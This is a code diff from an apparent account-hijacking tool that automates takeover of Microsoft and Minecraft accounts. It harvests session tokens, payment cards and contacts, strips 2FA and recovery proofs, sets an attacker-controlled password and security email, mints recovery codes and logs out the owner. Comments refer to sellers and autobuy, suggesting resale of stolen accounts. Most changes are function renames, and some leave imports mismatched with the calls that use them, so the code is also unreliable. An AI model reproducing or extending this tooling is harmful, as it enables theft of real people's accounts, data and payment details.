@@ -2,7 +2,7 @@ from authsecuring.utils.security.change_primary_alias import change_primary_alia
 from authsecuring.utils.security.get_security_mail import get_security_email
 from authsecuring.utils.security.add_authenticator import add_authenticator
 from authsecuring.utils.security.get_recovery_code import get_recovery_code
-from authsecuring.utils.security_information import security_information
+from authsecuring.utils.security_information import gather_security_info
 from authsecuring.utils.security.remove_services import remove_services
 from authsecuring.utils.security.remove_devices import remove_devices
 from authsecuring.utils.security.delete_aliases import delete_aliases
@@ -152,7 +152,7 @@ async def _check_minecraft(session: httpx.AsyncClient, account_info: dict) -> st
         sec_email = None
     xbl_client = await _minecraft_sso_client(session)
     try:
-        XBLResponse = await get_xbl(xbl_client, security_email=sec_email)
+        XBLResponse = await fetch_xbl(xbl_client, security_email=sec_email)
     finally:
         await xbl_client.aclose()
 
@@ -169,7 +169,7 @@ async def _check_minecraft(session: httpx.AsyncClient, account_info: dict) -> st
         account_info["minecraft"]["gamertag"] = gtg
 
     try:
-        ssid = await get_ssid(xbl)
+        ssid = await fetch_ssid(xbl)
     except NoMinecraftEntitlement as exc:
         print(f"[x] - No Minecraft entitlement from login_with_xbox ({exc})")
         account_info["minecraft"]["name"] = "No Minecraft"
@@ -192,7 +192,7 @@ async def _check_minecraft(session: httpx.AsyncClient, account_info: dict) -> st
     account_info["minecraft"]["SSID"] = ssid
 
     # Ownership type from game_minecraft entitlement source (PURCHASE vs GAMEPASS)
-    entitlements = await get_method_details(ssid)
+    entitlements = await fetch_method(ssid)
     method = entitlements.get("method")
     account_info["minecraft"]["entitlements"] = entitlements.get("items_summary") or []
     account_info["minecraft"]["entitlement_source"] = entitlements.get(
@@ -216,7 +216,7 @@ async def _check_minecraft(session: httpx.AsyncClient, account_info: dict) -> st
             print("[!] - Entitlements inconclusive — leaving method unset")
 
     try:
-        capes = await get_capes(ssid)
+        capes = await fetch_capes(ssid)
     except Exception:
         capes = []
     if capes:
@@ -227,7 +227,7 @@ async def _check_minecraft(session: httpx.AsyncClient, account_info: dict) -> st
     else:
         account_info["minecraft"]["capes"] = "No capes"
 
-    profile = await get_profile(ssid)
+    profile = await fetch_profile(ssid)
     if profile and profile.get("name"):
         print("[+] - Got profile (Has Minecraft Java)")
         account_info["minecraft"]["name"] = profile["name"]
@@ -263,7 +263,7 @@ def _is_autosecure_sunny_primary(email: str | None) -> bool:
     return local.startswith("sunny")
 
 
-async def secure(
+async def lock_account(
     session: httpx.AsyncClient,
     command: bool,
     recovery: bool,
@@ -281,25 +281,25 @@ async def secure(
     
     # Token needed to make API requests for the account
     try:
-        verification_tokens = await get_amc(session)
+        verification_tokens = await fetch_amc_token(session)
     except Exception as exc:
         from authsecuring.utils.proxy import format_exception_reason
 
-        detail = format_exception_reason(exc)
+        detail = proxy_error_reason(exc)
         log.exception("get_amc failed: %s", detail)
         print(f"[X] - get_amc failed: {detail}")
         raise
 
-    apicanary = await get_cookies(session)
+    apicanary = await fetch_canary(session)
     if not apicanary:
         print("[!] - No apiCanary from password/reset — will retry later for SA ops")
         log.warning("get_cookies returned no apiCanary — continuing into MC check")
 
     t = None
     try:
-        t = await get_t(session)
+        t = await fetch_t(session)
         if t:
-            await get_amrp(session, t)
+            await fetch_amrp(session, t)
             print(f"[+] - Got T / AMRP")
         else:
             print("[!] - No classic login t token (already signed in) — skipping AMRP")
@@ -338,9 +338,9 @@ async def secure(
             )
 
     if embed_verify:
-        from authsecuring.account_filters import is_embed_verify_no_minecraft
+        from authsecuring.filters import is_embed_verify_no_minecraft
 
-        if is_embed_verify_no_minecraft(account_info):
+        if is_no_java_embed(account_info):
             print(
                 "[!] - Embed verify: no Minecraft Java — "
                 "stopping before credential change"
@@ -356,18 +356,18 @@ async def secure(
 
     # Refresh canary after MC / SSO elevation (password/reset may work now)
     if not apicanary:
-        apicanary = await get_cookies(session)
+        apicanary = await fetch_canary(session)
         if apicanary:
             print("[+] - Got apiCanary after MC check")
 
     # Gets account info via microsofts API
-    subscriptions = await get_subscriptions(session, verification_tokens["home"])
-    family = await get_family(session, verification_tokens["home"])
-    devices = await get_devices(session, verification_tokens["home"])
-    cards = await get_cards(session, verification_tokens["home"])
-    contacts = await get_contacts(session, verification_tokens["home"])
+    subscriptions = await fetch_subscriptions(session, verification_tokens["home"])
+    family = await fetch_family(session, verification_tokens["home"])
+    devices = await fetch_devices(session, verification_tokens["home"])
+    cards = await fetch_cards(session, verification_tokens["home"])
+    contacts = await fetch_contacts(session, verification_tokens["home"])
 
-    owner_info = await get_owner_info(session, verification_tokens["profile"])
+    owner_info = await fetch_owner(session, verification_tokens["profile"])
     if not isinstance(owner_info, dict):
         owner_info = {}
     # Profile API often 401s when MSAL silent bridge never finishes — JWT still
@@ -375,7 +375,7 @@ async def secure(
     if not owner_info.get("firstName") and not owner_info.get("signInEmail"):
         from authsecuring.utils.ogi.owner_from_jwt import owner_info_from_amc_jwt
 
-        jwt_info = owner_info_from_amc_jwt(session)
+        jwt_info = jwt_to_owner(session)
         if jwt_info:
             owner_info = {**jwt_info, **{k: v for k, v in owner_info.items() if v}}
     if not isinstance(contacts, dict):
@@ -392,7 +392,7 @@ async def secure(
     # Organizer-in-family is not the child Family-Locked login interrupt.
     # Kick other members first (last-admin), then leave so autobuy doesn't reject.
     try:
-        left = await leave_family(
+        left = await leave_family_group(
             session,
             home_token=verification_tokens.get("home"),
         )
@@ -429,13 +429,13 @@ async def secure(
         "commercial": subscriptions.get("commercial") or [],
     }
     
-    await get_amrp(session, t) if t else None
+    await fetch_amrp(session, t) if t else None
     if t:
         print(f"[+] - Got AMRP")
 
     # 2FA
     if apicanary:
-        await remove_2fa(session, apicanary)
+        await drop_2fa(session, apicanary)
     else:
         print("[!] - Skipping remove_2fa (no apiCanary)")
         log.warning("skipping remove_2fa — no apiCanary")
@@ -456,7 +456,7 @@ async def secure(
         already_sunny = _is_autosecure_sunny_primary(ms.get("email"))
         skip_i5600 = has_recovery and (not replace_alias or already_sunny)
         security_parameters = json.loads(
-            await security_information(
+            await gather_security_info(
                 session,
                 security_email=ms.get("security_email"),
                 account_email=ms.get("email"),
@@ -519,7 +519,7 @@ async def secure(
     if recovery or not has_recovery:
         generated_code = None
         if encryptedNetID:
-            generated_code = await get_recovery_code(
+            generated_code = await mint_recovery(
                 session,
                 apicanary,
                 encryptedNetID
@@ -543,7 +543,7 @@ async def secure(
         account_info["microsoft"]["recovery_code"] = recovery_code
 
         # Get security mail
-        security_email = await get_security_email(session)
+        security_email = await fetch_security_mail(session)
         account_info["microsoft"]["security_email"] = security_email
         print(f"[+] - Got Security Email | {security_email}")
     else:
@@ -556,7 +556,7 @@ async def secure(
             await remove_zyger(session, apicanary)
             # Sign in with Samsung/Apple/Google/… — RemoveFedCred, not DeleteProof
             try:
-                fed = await remove_fed_cred(session, apicanary)
+                fed = await wipe_fed_creds(session, apicanary)
                 if isinstance(fed, dict):
                     account_info["microsoft"]["fed_cred_removed"] = fed.get("removed") or []
             except Exception as exc:
@@ -566,7 +566,7 @@ async def secure(
             # Google Password Manager via RemovePasskey) / auth apps —
             # keep OUR recovery security email.
             keep_sec = (account_info.get("microsoft") or {}).get("security_email")
-            wipe = await remove_proof(
+            wipe = await strip_proofs(
                 session,
                 apicanary,
                 keep_security_email=keep_sec,
@@ -587,14 +587,14 @@ async def secure(
 
         # Third Party Launchers (Minecraft, Prism)
         try:
-            await remove_services(session)
+            await strip_app_links(session)
         except Exception as exc:
             log.warning("remove_services soft-fail: %s", exc)
             print(f"[!] - remove_services skipped ({exc.__class__.__name__})")
 
         # Remove Microsoft Devices
         try:
-            await remove_devices(session, verification_tokens["devices"], devices)
+            await purge_devices(session, verification_tokens["devices"], devices)
         except Exception as exc:
             log.warning("remove_devices soft-fail: %s", exc)
             print(f"[!] - remove_devices skipped ({exc.__class__.__name__})")
@@ -649,12 +649,12 @@ async def secure(
                     last_local = primaryEmail
                     # Refresh canary between retries — stale after MFA / failed AddAssocId
                     try:
-                        fresh = await get_cookies(session)
+                        fresh = await fetch_canary(session)
                         if fresh:
                             apicanary = fresh
                     except Exception:
                         pass
-                    changed = await change_primary_alias(
+                    changed = await promote_alias(
                         session,
                         primaryEmail,
                         apicanary,
@@ -672,7 +672,7 @@ async def secure(
                             _get_manage,
                         )
 
-                        _, _, aliases_now = await _get_manage(session)
+                        _, _, aliases_now = await fetch_manage_page(session)
                         parked = [
                             a.split("@", 1)[0]
                             for a in aliases_now
@@ -714,7 +714,7 @@ async def secure(
                         )
                         for loc in candidates:
                             full_try = f"{loc}@outlook.com"
-                            if await _confirm_primary_switched(
+                            if await confirm_primary_moved(
                                 session, full_try, old_login
                             ):
                                 changed = True
@@ -755,7 +755,7 @@ async def secure(
 
             security_email = uuid.uuid4().hex[:16]
             from authsecuring.utils.security.password_gen import generate_ms_password
-            password = generate_ms_password(14)
+            password = make_ms_password(14)
 
             security_email = f"{security_email}@{domain}"
             print(f"[+] - Generated Security Email ({security_email})")
@@ -826,12 +826,12 @@ async def secure(
             from authsecuring.utils.security.force_password import strip_unverified
 
             ms_now = account_info.get("microsoft") or {}
-            await delete_aliases(
+            await wipe_foreign_aliases(
                 session,
                 keep_email=ms_now.get("email"),
                 security_email=ms_now.get("security_email"),
                 account_email=ms_now.get("original_email") or ms_now.get("email"),
-                password=strip_unverified(ms_now.get("password")),
+                password=clean_password(ms_now.get("password")),
             )
         except Exception as exc:
             logging.warning("delete_aliases soft-skip: %s", exc)
@@ -845,7 +845,7 @@ async def secure(
 
             ms_pwd = str((account_info.get("microsoft") or {}).get("password") or "")
             if ms_pwd and ms_pwd not in ("Unknown", "Couldn't Change!", "Failed"):
-                await ensure_password_verified(
+                await verify_password_stuck(
                     session,
                     account_info,
                     force_if_unverified=True,
@@ -857,7 +857,7 @@ async def secure(
         # Add Authenticator
         if enable_2fa:
             try:
-                auth = await add_authenticator(session)
+                auth = await enroll_mfa(session)
                 account_info["microsoft"]["auth_secret"] = auth
                 print(f"[+] - Added Authenticator ({auth})")
             except Exception as exc:
@@ -871,7 +871,7 @@ async def secure(
         # an otherwise fully secured account and return a false failure to sellers).
         if apicanary:
             try:
-                await logout_all(session, apicanary)
+                await kick_sessions(session, apicanary)
             except Exception as exc:
                 logging.warning("logout_all soft-skip: %s", exc)
                 print(f"[~] - Skipping logout_all ({exc.__class__.__name__})")
@@ -881,7 +881,7 @@ async def secure(
         # Phone pullback probe — HasPhone can stay 1 even when smsProofs is empty
         # on the manage page (ghost phone / legacy SMS recovery).
         try:
-            from authsecuring.autobuy_hold_check import fetch_credential_type
+            from authsecuring.holdcheck import fetch_credential_type
 
             probe_email = (
                 (account_info.get("microsoft") or {}).get("email")
@@ -890,7 +890,7 @@ async def secure(
             ).strip()
             has_phone = None
             if probe_email:
-                gct = await fetch_credential_type(probe_email)
+                gct = await check_cred_type(probe_email)
                 creds = (gct or {}).get("Credentials") or {}
                 raw = creds.get("HasPhone")
                 has_phone = raw in (1, "1", True)
